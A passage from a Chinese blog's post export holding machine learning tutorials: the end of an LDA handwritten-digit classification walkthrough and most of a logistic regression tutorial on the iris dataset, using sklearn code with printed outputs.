lda.predict(a))print(f&quot;&#123;a&#125; 类别概率分别是: &quot;, lda.predict_proba(a))a = np.array([[-12, -0.1, -0.1]])print(f&quot;&#123;a&#125; 类别是: &quot;, lda.predict(a))print(f&quot;&#123;a&#125; 类别概率分别是: &quot;, lda.predict_proba(a))a = np.array([[0.1, 90.1, 9.1]])print(f&quot;&#123;a&#125; 类别是: &quot;, lda.predict(a))print(f&quot;&#123;a&#125; 类别概率分别是: &quot;, lda.predict_proba(a)) [[-1. 0.1 0.1]] 类别是: [0] [[-1. 0.1 0.1]] 类别概率分别是: [[9.37611354e-01 1.88760664e-05 3.36891510e-02 2.86806189e-02]] [[ -12 -100 -91]] 类别是: [1] [[ -12 -100 -91]] 类别概率分别是: [[1.08769337e-028 1.00000000e+000 1.54515810e-221 9.05666876e-183]] [[-12. -0.1 -0.1]] 类别是: [2] [[-12. -0.1 -0.1]] 类别概率分别是: [[1.60268201e-07 1.46912978e-39 9.99999840e-01 3.57001075e-28]] [[ 0.1 90.1 9.1]] 类别是: [3] [[ 0.1 90.1 9.1]] 类别概率分别是: [[8.42065614e-08 9.45021749e-11 8.63060269e-02 9.13693889e-01]] # Part 2 基于 LDA 手写数字分类实践 ¶ # Step1: 库函数导入 1234567891011# 导入手写数据集 MNISTfrom sklearn.datasets import load_digits# 导入训练集分割方法from sklearn.model_selection import train_test_split# 导入LDA模型from sklearn.discriminant_analysis import LinearDiscriminantAnalysis# 导入预测指标计算函数和混淆矩阵计算函数from sklearn.metrics import classification_report, confusion_matrix# 导入绘图包import seaborn as snsimport matplotlib Step2: 数据读取 / 载入 123456789# 导入MNIST数据集mnist = load_digits()# 查看数据集信息print(&#x27;The Mnist dataeset:\\n&#x27;,mnist)# 分割数据为训练集和测试集x, test_x, y, test_y = train_test_split(mnist.data, mnist.target, test_size=0.1, random_state=2) The Mnist dataeset: &#123;'data': array([[ 0., 0., 5., ..., 0., 0., 0.], [ 0., 0., 0., ..., 10., 0., 0.], [ 0., 0., 0., ..., 16., 9., 0.], ..., [ 0., 0., 1., ..., 6., 0., 0.], [ 0., 0., 2., ..., 12., 0., 0.], [ 0., 0., 10., ..., 12., 1., 0.]]), 'target': array([0, 1, 2, ..., 8, 9, 8]), 'frame': None, 'feature_names': ['pixel_0_0', 'pixel_0_1', 'pixel_0_2', 'pixel_0_3', 'pixel_0_4', 'pixel_0_5', 'pixel_0_6', 'pixel_0_7', 'pixel_1_0', 'pixel_1_1', 'pixel_1_2', 'pixel_1_3', 'pixel_1_4', 'pixel_1_5', 'pixel_1_6', 'pixel_1_7', 'pixel_2_0', 'pixel_2_1', 'pixel_2_2', 'pixel_2_3', 'pixel_2_4', 'pixel_2_5', 'pixel_2_6', 'pixel_2_7', 'pixel_3_0', 'pixel_3_1', 'pixel_3_2', 'pixel_3_3', 'pixel_3_4', 'pixel_3_5', 'pixel_3_6', 'pixel_3_7', 'pixel_4_0', 'pixel_4_1', 'pixel_4_2', 'pixel_4_3', 'pixel_4_4', 'pixel_4_5', 'pixel_4_6', 'pixel_4_7', 'pixel_5_0', 'pixel_5_1', 'pixel_5_2', 'pixel_5_3', 'pixel_5_4', 'pixel_5_5', 'pixel_5_6', 'pixel_5_7', 'pixel_6_0', 'pixel_6_1', 'pixel_6_2', 'pixel_6_3', 'pixel_6_4', 'pixel_6_5', 'pixel_6_6', 'pixel_6_7', 'pixel_7_0', 'pixel_7_1', 'pixel_7_2', 'pixel_7_3', 'pixel_7_4', 'pixel_7_5', 'pixel_7_6', 'pixel_7_7'], 'target_names': array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9]), 'images': array([[[ 0., 0., 5., ..., 1., 0., 0.], [ 0., 0., 13., ..., 15., 5., 0.], [ 0., 3., 15., ..., 11., 8., 0.], ..., [ 0., 4., 11., ..., 12., 7., 0.], [ 0., 2., 14., ..., 12., 0., 0.], [ 0., 0., 6., ..., 0., 0., 0.]], [[ 0., 0., 0., ..., 5., 0., 0.], [ 0., 0., 0., ..., 9., 0., 0.], [ 0., 0., 3., ..., 6., 0., 0.], ..., [ 0., 0., 1., ..., 6., 0., 0.], [ 0., 0., 1., ..., 6., 0., 0.], [ 0., 0., 0., ..., 10., 0., 0.]], [[ 0., 0., 0., ..., 12., 0., 0.], [ 0., 0., 3., ..., 14., 0., 0.], [ 0., 0., 8., ..., 16., 0., 0.], ..., [ 0., 9., 16., ..., 0., 0., 0.], [ 0., 3., 13., ..., 11., 5., 0.], [ 0., 0., 0., ..., 16., 9., 0.]], ..., [[ 0., 0., 1., ..., 1., 0., 0.], [ 0., 0., 13., ..., 2., 1., 0.], [ 0., 0., 16., ..., 16., 5., 0.], ..., [ 0., 0., 16., ..., 15., 0., 0.], [ 0., 0., 15., ..., 16., 0., 0.], [ 0., 0., 2., ..., 6., 0., 0.]], [[ 0., 0., 2., ..., 0., 0., 0.], [ 0., 0., 14., ..., 15., 1., 0.], [ 0., 4., 16., ..., 16., 7., 0.], ..., [ 0., 0., 0., ..., 16., 2., 0.], [ 0., 0., 4., ..., 16., 2., 0.], [ 0., 0., 5., ..., 12., 0., 0.]], [[ 0., 0., 10., ..., 1., 0., 0.], [ 0., 2., 16., ..., 1., 0., 0.], [ 0., 0., 15., ..., 15., 0., 0.], ..., [ 0., 4., 16., ..., 16., 6., 0.], [ 0., 8., 16., ..., 16., 8., 0.], [ 0., 1., 8., ..., 12., 1., 0.]]]), 'DESCR': &quot;.. _digits_dataset:\\n\\nOptical recognition of handwritten digits dataset\\n--------------------------------------------------\\n\\n**Data Set Characteristics:**\\n\\n :Number of Instances: 1797\\n :Number of Attributes: 64\\n :Attribute Information: 8x8 image of integer pixels in the range 0..16.\\n :Missing Attribute Values: None\\n :Creator: E. Alpaydin (alpaydin '@' boun.edu.tr)\\n :Date: July; 1998\\n\\nThis is a copy of the test set of the UCI ML hand-written digits datasets\\nhttps://archive.ics.uci.edu/ml/datasets/Optical+Recognition+of+Handwritten+Digits\\n\\nThe data set contains images of hand-written digits: 10 classes where\\neach class refers to a digit.\\n\\nPreprocessing programs made available by NIST were used to extract\\nnormalized bitmaps of handwritten digits from a preprinted form. From a\\ntotal of 43 people, 30 contributed to the training set and different 13\\nto the test set. 32x32 bitmaps are divided into nonoverlapping blocks of\\n4x4 and the number of on pixels are counted in each block. This generates\\nan input matrix of 8x8 where each element is an integer in the range\\n0..16. This reduces dimensionality and gives invariance to small\\ndistortions.\\n\\nFor info on NIST preprocessing routines, see M. D. Garris, J. L. Blue, G.\\nT. Candela, D. L. Dimmick, J. Geist, P. J. Grother, S. A. Janet, and C.\\nL. Wilson, NIST Form-Based Handprint Recognition System, NISTIR 5469,\\n1994.\\n\\n.. topic:: References\\n\\n - C. Kaynak (1995) Methods of Combining Multiple Classifiers and Their\\n Applications to Handwritten Digit Recognition, MSc Thesis, Institute of\\n Graduate Studies in Science and Engineering, Bogazici University.\\n - E. Alpaydin, C. Kaynak (1998) Cascading Classifiers, Kybernetika.\\n - Ken Tang and Ponnuthurai N. Suganthan and Xi Yao and A. Kai Qin.\\n Linear dimensionalityreduction using relevance weighted LDA. School of\\n Electrical and Electronic Engineering Nanyang Technological University.\\n 2005.\\n - Claudio Gentile. A New Approximate Maximal Margin Classification\\n Algorithm. NIPS. 2000.\\n&quot;&#125; Step3: 数据信息简单查看与可视化 12345678910## 输出示例图像images = range(0,9)plt.figure(dpi=100)for i in images: plt.subplot(330 + 1 + i) plt.imshow(x[i].reshape(8, 8), cmap = matplotlib.cm.binary,interpolation=&quot;nearest&quot;)# show the plotplt.show() ​ ​ Step4: 利用 LDA 在手写数字上进行训练和预测 1234# 建立 LDA 模型m_lda = LinearDiscriminantAnalysis()# 进行模型训练m_lda.fit(x, y) LinearDiscriminantAnalysis() 123456# 进行模型预测x_new = m_lda.transform(x)# 可视化预测数据plt.scatter(x_new[:, 0], x_new[:, 1], marker=&#x27;o&#x27;, c=y)plt.title(&#x27;MNIST with LDA Model&#x27;)plt.show() ​ ​ 1234# 进行测试集数据的类别预测y_test_pred = m_lda.predict(test_x)print(&quot;测试集的真实标签:\\n&quot;, test_y)print(&quot;测试集的预测标签:\\n&quot;, y_test_pred) 测试集的真实标签: [4 0 9 1 4 7 1 5 1 6 6 7 6 1 5 5 4 6 2 7 4 6 4 1 5 2 9 5 4 6 5 6 3 4 0 9 9 8 4 6 8 8 5 7 9 6 9 6 1 3 0 1 9 7 3 3 1 1 8 8 9 8 5 4 4 7 3 5 8 4 3 1 3 8 7 3 3 0 8 7 2 8 5 3 8 7 6 4 6 2 2 0 1 1 5 3 5 7 6 8 2 2 6 4 6 7 3 7 3 9 4 7 0 3 5 8 5 0 3 9 2 7 3 2 0 8 1 9 2 1 9 1 0 3 4 3 0 9 3 2 2 7 3 1 6 7 2 8 3 1 1 6 4 8 2 1 8 4 1 3 1 1 9 5 4 8 7 4 8 9 5 7 6 9 0 0 4 0 0 4] 测试集的预测标签: [4 0 9 1 8 7 1 5 1 6 6 7 6 2 5 5 8 6 2 7 4 6 4 1 5 2 9 5 4 6 5 6 3 4 0 9 9 8 4 6 8 1 5 7 9 6 9 6 1 3 0 1 9 7 3 3 1 1 8 8 9 8 5 8 4 9 3 5 8 4 3 9 3 8 7 3 3 0 8 7 2 8 5 3 8 7 6 4 6 2 2 0 1 1 5 3 5 7 1 8 2 2 6 4 6 7 3 7 3 9 4 7 0 3 5 1 5 0 3 9 2 7 3 2 0 8 1 9 2 1 9 9 0 3 4 3 0 8 3 2 2 7 3 1 6 7 2 8 3 1 1 6 4 8 2 1 8 4 1 3 1 1 9 5 4 9 7 4 8 9 5 7 6 9 6 0 4 0 0 9] 12# 进行预测结果指标统计 统计每一类别的预测准确率、召回率、F1分数print(classification_report(test_y, y_test_pred)) precision recall f1-score support 0 1.00 0.93 0.96 14 1 0.86 0.86 0.86 22 2 0.93 1.00 0.97 14 3 1.00 1.00 1.00 22 4 1.00 0.81 0.89 21 5 1.00 1.00 1.00 16 6 0.94 0.94 0.94 18 7 1.00 0.94 0.97 18 8 0.80 0.84 0.82 19 9 0.75 0.94 0.83 16 accuracy 0.92 180 macro avg 0.93 0.93 0.93 180 weighted avg 0.93 0.92 0.92 180 ​ 1234567891011121314151617# 计算混淆矩阵C2 = confusion_matrix(test_y, y_test_pred)# 打混淆矩阵print(C2)# 将混淆矩阵以热力图的防线显示sns.set()f, ax = plt.subplots()# 画热力图sns.heatmap(C2, cmap=&quot;YlGnBu_r&quot;, annot=True, ax=ax) # 标题 ax.set_title(&#x27;confusion matrix&#x27;)# x轴为预测类别ax.set_xlabel(&#x27;predict&#x27;) # y轴实际类别ax.set_ylabel(&#x27;true&#x27;) plt.show() [[13 0 0 0 0 0 1 0 0 0] [ 0 19 1 0 0 0 0 0 0 2] [ 0 0 14 0 0 0 0 0 0 0] [ 0 0 0 22 0 0 0 0 0 0] [ 0 0 0 0 17 0 0 0 3 1] [ 0 0 0 0 0 16 0 0 0 0] [ 0 1 0 0 0 0 17 0 0 0] [ 0 0 0 0 0 0 0 17 0 1] [ 0 2 0 0 0 0 0 0 16 1] [ 0 0 0 0 0 0 0 0 1 15]] # 5. 算法重要知识点 LDA 算法的一个目标是使得不同类别之间的距离越远越好，同一类别之中的距离越近越好。那么不同类别之间的距离越远越好，我们是可以理解的，就是越远越好区分。同时，协方差不仅是反映了变量之间的相关性，同样反映了多维样本分布的离散程度（一维样本使用方差），协方差越大（对于负相关来说是绝对值越大），表示数据的分布越分散。所以上面的 “欲使同类样例的投影点尽可能接近，可以让同类样本点的协方差矩阵尽可能小” 就可以理解了。 J(w)=wT∣u1−u2∣2s12+s22J(w) = \\frac{w^T{|u_1-u_2|}^2}{s_1^2+s_2^2} J(w)=s12​+s22​wT∣u1​−u2​∣2​ 如上述公式J(w)J(w)J(w) 所示，分子为投影数据后的均值只差，分母为方差之后，LDA 的目的就是使得 J 值最大化，那么可以理解为最大化分子，即使得类别之间的距离越远，同时最小化分母，使得每个类别内部的方差越小，这样就能使得每个类类别的数据可以在投影矩阵 w 的映射下，分的越开。 需要注意的是，LDA 模型适用于线性可分数据，对于上述实战中用到的 MNIST 手写数据（其实是非线性的），但是依然可以取得较好的分类效果；但在以后的实战中需要注意 LDA 在非线性可分数据上的谨慎使用。","categories":[{"name":"天池机器学习入门","slug":"天池机器学习入门","permalink":"http://example.com/categories/%E5%A4%A9%E6%B1%A0%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"基于逻辑回归的分类预测","slug":"机器学习/天池/基于逻辑回归的分类预测","date":"2021-11-08T07:02:54.000Z","updated":"2021-12-08T08:14:30.001Z","comments":true,"path":"2021/11/08/机器学习/天池/基于逻辑回归的分类预测/","link":"","permalink":"http://example.com/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%9F%BA%E4%BA%8E%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%E7%9A%84%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/","excerpt":"","text":"# 机器学习算法（一）: 基于逻辑回归的分类预测 # 逻辑回归的介绍和应用 # 1.1 逻辑回归的介绍 逻辑回归（Logistic regression，简称 LR）虽然其中带有 &quot;回归&quot; 两个字，但逻辑回归其实是一个分类模型，并且广泛应用于各个领域之中。虽然现在深度学习相对于这些传统方法更为火热，但实则这些传统方法由于其独特的优势依然广泛应用于各个领域中。 而对于逻辑回归而且，最为突出的两点就是其模型简单和模型的可解释性强。 逻辑回归模型的优劣势: 优点：实现简单，易于理解和实现；计算代价不高，速度很快，存储资源低； 缺点：容易欠拟合，分类精度可能不高 # 1.2 逻辑回归的应用 逻辑回归模型广泛用于各个领域，包括机器学习，大多数医学领域和社会科学。例如，最初由 Boyd 等人开发的创伤和损伤严重度评分（TRISS）被广泛用于预测受伤患者的死亡率，使用逻辑回归 基于观察到的患者特征（年龄，性别，体重指数，各种血液检查的结果等）分析预测发生特定疾病（例如糖尿病，冠心病）的风险。逻辑回归模型也用于预测在给定的过程中，系统或产品的故障的可能性。还用于市场营销应用程序，例如预测客户购买产品或中止订购的倾向等。在经济学中它可以用来预测一个人选择进入劳动力市场的可能性，而商业应用则可以用来预测房主拖欠抵押贷款的可能性。条件随机字段是逻辑回归到顺序数据的扩展，用于自然语言处理。 逻辑回归模型现在同样是很多分类算法的基础组件，比如 分类任务中基于 GBDT 算法 + LR 逻辑回归实现的信用卡交易反欺诈，CTR (点击通过率) 预估等，其好处在于输出值自然地落在 0 到 1 之间，并且有概率意义。模型清晰，有对应的概率学理论基础。它拟合出来的参数就代表了每一个特征 (feature) 对结果的影响。也是一个理解数据的好工具。但同时由于其本质上是一个线性的分类器，所以不能应对较为复杂的数据情况。很多时候我们也会拿逻辑回归模型去做一些任务尝试的基线（基础水平）。 说了这些逻辑回归的概念和应用，大家应该已经对其有所期待了吧，那么我们现在开始吧！！！ # 2 学习目标 了解 逻辑回归 的理论 掌握 逻辑回归 的 sklearn 函数调用使用并将其运用到鸢尾花数据集预测 # 3 代码流程 Part1 Demo 实践 Step1: 库函数导入 Step2: 模型训练 Step3: 模型参数查看 Step4: 数据和模型可视化 Step5: 模型预测 Part2 基于鸢尾花（iris）数据集的逻辑回归分类实践 Step1: 库函数导入 Step2: 数据读取 / 载入 Step3: 数据信息简单查看 Step4: 可视化描述 Step5: 利用 逻辑回归模型 在二分类上 进行训练和预测 Step5: 利用 逻辑回归模型 在三分类 (多分类) 上 进行训练和预测 # 4 算法实战 # 4.1 Demo 实践 Step1: 库函数导入 123456789## 基础函数库import numpy as np ## 导入画图库import matplotlib.pyplot as pltimport seaborn as sns## 导入逻辑回归模型函数from sklearn.linear_model import LogisticRegression Step2: 模型训练 1234567891011##Demo演示LogisticRegression分类## 构造数据集x_fearures = np.array([[-1, -2], [-2, -1], [-3, -2], [1, 3], [2, 1], [3, 2]])y_label = np.array([0, 0, 0, 1, 1, 1])## 调用逻辑回归模型lr_clf = LogisticRegression()## 用逻辑回归模型拟合构造的数据集lr_clf = lr_clf.fit(x_fearures, y_label) #其拟合方程为 y=w0+w1*x1+w2*x2 Step3: 模型参数查看 12345## 查看其对应模型的wprint(&#x27;the weight of Logistic Regression:&#x27;,lr_clf.coef_)## 查看其对应模型的w0print(&#x27;the intercept(w0) of Logistic Regression:&#x27;,lr_clf.intercept_) the weight of Logistic Regression: [[0.73455784 0.69539712]] the intercept(w0) of Logistic Regression: [-0.13139986] Step4: 数据和模型可视化 12345## 可视化构造的数据样本点plt.figure()plt.scatter(x_fearures[:,0],x_fearures[:,1], c=y_label, s=50, cmap=&#x27;viridis&#x27;)plt.title(&#x27;Dataset&#x27;)plt.show() ​ 123456789101112131415# 可视化决策边界plt.figure()plt.scatter(x_fearures[:,0],x_fearures[:,1], c=y_label, s=50, cmap=&#x27;viridis&#x27;)plt.title(&#x27;Dataset&#x27;)nx, ny = 200, 100x_min, x_max = plt.xlim()y_min, y_max = plt.ylim()x_grid, y_grid = np.meshgrid(np.linspace(x_min, x_max, nx),np.linspace(y_min, y_max, ny))z_proba = lr_clf.predict_proba(np.c_[x_grid.ravel(), y_grid.ravel()])z_proba = z_proba[:, 1].reshape(x_grid.shape)plt.contour(x_grid, y_grid, z_proba, [0.5], linewidths=2., colors=&#x27;blue&#x27;)plt.show() ​ 123456789101112131415161718192021### 可视化预测新样本plt.figure()## new point 1x_fearures_new1 = np.array([[0, -1]])plt.scatter(x_fearures_new1[:,0],x_fearures_new1[:,1], s=50, cmap=&#x27;viridis&#x27;)plt.annotate(s=&#x27;New point 1&#x27;,xy=(0,-1),xytext=(-2,0),color=&#x27;blue&#x27;,arrowprops=dict(arrowstyle=&#x27;-|&gt;&#x27;,connectionstyle=&#x27;arc3&#x27;,color=&#x27;red&#x27;))## new point 2x_fearures_new2 = np.array([[1, 2]])plt.scatter(x_fearures_new2[:,0],x_fearures_new2[:,1], s=50, cmap=&#x27;viridis&#x27;)plt.annotate(s=&#x27;New point 2&#x27;,xy=(1,2),xytext=(-1.5,2.5),color=&#x27;red&#x27;,arrowprops=dict(arrowstyle=&#x27;-|&gt;&#x27;,connectionstyle=&#x27;arc3&#x27;,color=&#x27;red&#x27;))## 训练样本plt.scatter(x_fearures[:,0],x_fearures[:,1], c=y_label, s=50, cmap=&#x27;viridis&#x27;)plt.title(&#x27;Dataset&#x27;)# 可视化决策边界plt.contour(x_grid, y_grid, z_proba, [0.5], linewidths=2., colors=&#x27;blue&#x27;)plt.show() c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\ipykernel_launcher.py:7: MatplotlibDeprecationWarning: The 's' parameter of annotate() has been renamed 'text' since Matplotlib 3.3; support for the old name will be dropped two minor releases later. import sys c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\ipykernel_launcher.py:12: MatplotlibDeprecationWarning: The 's' parameter of annotate() has been renamed 'text' since Matplotlib 3.3; support for the old name will be dropped two minor releases later. if sys.path[0] == '': Step5: 模型预测 12345678910111213## 在训练集和测试集上分别利用训练好的模型进行预测y_label_new1_predict = lr_clf.predict(x_fearures_new1)y_label_new2_predict = lr_clf.predict(x_fearures_new2)print(&#x27;The New point 1 predict class:\\n&#x27;,y_label_new1_predict)print(&#x27;The New point 2 predict class:\\n&#x27;,y_label_new2_predict)## 由于逻辑回归模型是概率预测模型（前文介绍的 p = p(y=1|x,\\theta)）,所以我们可以利用 predict_proba 函数预测其概率y_label_new1_predict_proba = lr_clf.predict_proba(x_fearures_new1)y_label_new2_predict_proba = lr_clf.predict_proba(x_fearures_new2)print(&#x27;The New point 1 predict Probability of each class:\\n&#x27;,y_label_new1_predict_proba)print(&#x27;The New point 2 predict Probability of each class:\\n&#x27;,y_label_new2_predict_proba) The New point 1 predict class: [0] The New point 2 predict class: [1] The New point 1 predict Probability of each class: [[0.69567724 0.30432276]] The New point 2 predict Probability of each class: [[0.11983936 0.88016064]] # 4.2 基于鸢尾花（iris）数据集的逻辑回归分类实践 在实践的最开始，我们首先需要导入一些基础的函数库包括：numpy （Python 进行科学计算的基础软件包），pandas（pandas 是一种快速，强大，灵活且易于使用的开源数据分析和处理工具），matplotlib 和 seaborn 绘图。 Step1: 库函数导入 1234567## 基础函数库import numpy as np import pandas as pd## 绘图函数库import matplotlib.pyplot as pltimport seaborn as sns 本次我们选择鸢花数据（iris）进行方法的尝试训练，该数据集一共包含 5 个变量，其中 4 个特征变量，1 个目标分类变量。共有 150 个样本，目标变量为 花的类别 其都属于鸢尾属下的三个亚属，分别是山鸢尾 (Iris-setosa)，变色鸢尾 (Iris-versicolor) 和维吉尼亚鸢尾 (Iris-virginica)。包含的三种鸢尾花的四个特征，分别是花萼长度 (cm)、花萼宽度 (cm)、花瓣长度 (cm)、花瓣宽度 (cm)，这些形态特征在过去被用来识别物种。 变量 描述 sepal length 花萼长度 (cm) sepal width 花萼宽度 (cm) petal length 花瓣长度 (cm) petal width 花瓣宽度 (cm) target 鸢尾的三个亚属类别，‘setosa’(0), ‘versicolor’(1), ‘virginica’(2) Step2: 数据读取 / 载入 1234567## 我们利用 sklearn 中自带的 iris 数据作为数据载入，#并利用Pandas转化为DataFrame格式from sklearn.datasets import load_irisdata = load_iris() #得到数据特征iris_target = data.target #得到数据对应的标签iris_features = pd.DataFrame(data=data.data, columns=data.feature_names) #利用Pandas转化为DataFrame格式 Step3: 数据信息简单查看 12## 利用.info()查看数据的整体信息iris_features.info() &lt;class 'pandas.core.frame.DataFrame'&gt; RangeIndex: 150 entries, 0 to 149 Data columns (total 4 columns): # Column Non-Null Count Dtype --- ------ -------------- ----- 0 sepal length (cm) 150 non-null float64 1 sepal width (cm) 150 non-null float64 2 petal length (cm) 150 non-null float64 3 petal width (cm) 150 non-null float64 dtypes: float64(4) memory usage: 4.8 KB 12## 进行简单的数据查看，我们可以利用 .head() 头部.tail()尾部iris_features.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; sepal length (cm) sepal width (cm) petal length (cm) petal width (cm) 0 5.1 3.5 1.4 0.2 1 4.9 3.0 1.4 0.2 2 4.7 3.2 1.3 0.2 3 4.6 3.1 1.5 0.2 4 5.0 3.6 1.4 0.2 1iris_features.tail() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; sepal length (cm) sepal width (cm) petal length (cm) petal width (cm) 145 6.7 3.0 5.2 2.3 146 6.3 2.5 5.0 1.9 147 6.5 3.0 5.2 2.0 148 6.2 3.4 5.4 2.3 149 5.9 3.0 5.1 1.8 12## 其对应的类别标签为，其中0，1，2分别代表&#x27;setosa&#x27;, &#x27;versicolor&#x27;, &#x27;virginica&#x27;三种不同花的类别。iris_target array([0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2]) 12## 利用value_counts函数查看每个类别数量pd.Series(iris_target).value_counts() 0 50 1 50 2 50 dtype: int64 12## 对于特征进行一些统计描述iris_features.describe() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; sepal length (cm) sepal width (cm) petal length (cm) petal width (cm) count 150.000000 150.000000 150.000000 150.000000 mean 5.843333 3.057333 3.758000 1.199333 std 0.828066 0.435866 1.765298 0.762238 min 4.300000 2.000000 1.000000 0.100000 25% 5.100000 2.800000 1.600000 0.300000 50% 5.800000 3.000000 4.350000 1.300000 75% 6.400000 3.300000 5.100000 1.800000 max 7.900000 4.400000 6.900000 2.500000 从统计描述中我们可以看到不同数值特征的变化范围。 Step4: 可视化描述 123## 合并标签和特征信息iris_all = iris_features.copy() ##进行浅拷贝，防止对于原始数据的修改iris_all[&#x27;target&#x27;] = iris_target 123## 特征与标签组合的散点可视化sns.pairplot(data=iris_all,diag_kind=&#x27;hist&#x27;, hue= &#x27;target&#x27;)plt.show() ​ 从上图可以发现，在 2D 情况下不同的特征组合对于不同类别的花的散点分布，以及大概的区分能力。 1234for col in iris_features.columns: sns.boxplot(x=&#x27;target&#x27;, y=col, saturation=0.5,palette=&#x27;pastel&#x27;, data=iris_all) plt.title(col) plt.show() ​ 利用箱型图我们也可以得到不同类别在不同特征上的分布差异情况。 12345678910111213141516# 选取其前三个特征绘制三维散点图from mpl_toolkits.mplot3d import Axes3Dfig = plt.figure(figsize=(10,8))ax = fig.add_subplot(111, projection=&#x27;3d&#x27;)iris_all_class0 = iris_all[iris_all[&#x27;target&#x27;]==0].valuesiris_all_class1 = iris_all[iris_all[&#x27;target&#x27;]==1].valuesiris_all_class2 = iris_all[iris_all[&#x27;target&#x27;]==2].values# &#x27;setosa&#x27;(0), &#x27;versicolor&#x27;(1), &#x27;virginica&#x27;(2)ax.scatter(iris_all_class0[:,0], iris_all_class0[:,1], iris_all_class0[:,2],label=&#x27;setosa&#x27;)ax.scatter(iris_all_class1[:,0], iris_all_class1[:,1], iris_all_class1[:,2],label=&#x27;versicolor&#x27;)ax.scatter(iris_all_class2[:,0], iris_all_class2[:,1], iris_all_class2[:,2],label=&#x27;virginica&#x27;)plt.legend()plt.show() ​ Step5: 利用 逻辑回归模型 在二分类上 进行训练和预测 123456789101112## 为了正确评估模型性能，将数据划分为训练集和测试集，并在训练集上训练模型，在测试集上验证模型性能。from sklearn.model_selection import train_test_split## 选择其类别为0和1的样本 （不包括类别为2的样本）iris_features_part = iris_features.iloc[:100]iris_target_part = iris_target[:100]## 测试集大小为20%， 80%/20%分x_train, x_test, y_train, y_test = train_test_split(iris_features_part, iris_target_part, test_size = 0.2, random_state = 2020) 12## 从sklearn中导入逻辑回归模型from sklearn.linear_model import LogisticRegression 12## 定义 逻辑回归模型 clf = LogisticRegression(random_state=0, solver=&#x27;lbfgs&#x27;) 12# 在训练集上训练逻辑回归模型clf.fit(x_train, y_train) LogisticRegression(random_state=0) 12345## 查看其对应的wprint(&#x27;the weight of Logistic Regression:&#x27;,clf.coef_)## 查看其对应的w0print(&#x27;the intercept(w0) of Logistic Regression:&#x27;,clf.intercept_) the weight of Logistic Regression: [[ 0.45181973 -0.81743611 2.14470304 0.89838607]] the intercept(w0) of Logistic Regression: [-6.53367714] 123## 在训练集和测试集上分布利用训练好的模型进行预测train_predict = clf.predict(x_train)test_predict = clf.predict(x_test) 12345678910111213141516from sklearn import metrics## 利用accuracy（准确度）【预测正确的样本数目占总预测样本数目的比例】评估模型效果print(&#x27;The accuracy of the Logistic Regression is:&#x27;,metrics.accuracy_score(y_train,train_predict))print(&#x27;The accuracy of the Logistic Regression is:&#x27;,metrics.accuracy_score(y_test,test_predict))## 查看混淆矩阵 (预测值和真实值的各类情况统计矩阵)confusion_matrix_result = metrics.confusion_matrix(test_predict,y_test)print(&#x27;The confusion matrix result:\\n&#x27;,confusion_matrix_result)# 利用热力图对于结果进行可视化plt.figure(figsize=(8, 6))sns.heatmap(confusion_matrix_result, annot=True, cmap=&#x27;Blues&#x27;)plt.xlabel(&#x27;Predicted labels&#x27;)plt.ylabel(&#x27;True labels&#x27;)plt.show() The accuracy of the Logistic Regression is: 1.0 The accuracy of the Logistic Regression is: 1.0 The confusion matrix result: [[ 9 0] [ 0 11]] 我们可以发现其准确度为 1，代表所有的样本都预测正确了。 Step6: 利用 逻辑回归模型 在三分类 (多分类) 上 进行训练和预测 1234## 测试集大小为20%， 80%/20%分x_train, x_test, y_train, y_test = train_test_split(iris_features, iris_target, test_size = 0.2, random_state = 2020) 12## 定义 逻辑回归模型 clf = LogisticRegression(random_state=0, solver=&#x27;lbfgs&#x27;) 12# 在训练集上训练逻辑回归模型clf.fit(x_train, y_train) LogisticRegression(random_state=0) 1234567## 查看其对应的wprint(&#x27;the weight of Logistic Regression:\\n&#x27;,clf.coef_)## 查看其对应的w0print(&#x27;the intercept(w0) of Logistic Regression:\\n&#x27;,clf.intercept_)## 由于这个是3分类，所有我们这里得到了三个逻辑回归模型的参数，其三个逻辑回归组合起来即可实现三分类。 the weight of Logistic Regression: [[-0.45928925 0.83069887 -2.26606531 -0.99743981] [ 0.33117319 -0.72863424 -0.06841147 -0.9871103 ] [ 0.12811606 -0.10206464 2.33447678 1.98455011]] the intercept(w0) of Logistic Regression: [ 9.4388067 3.93047364 -13.36928034] 1234567891011121314## 在训练集和测试集上分布利用训练好的模型进行预测train_predict = clf.predict(x_train)test_predict = clf.predict(x_test)## 由于逻辑回归模型是概率预测模型（前文介绍的 p = p(y=1|x,\\theta)）,所有我们可以利用 predict_proba 函数预测其概率train_predict_proba = clf.predict_proba(x_train)test_predict_proba = clf.predict_proba(x_test)print(&#x27;The test predict Probability of each class:\\n&#x27;,test_predict_proba)## 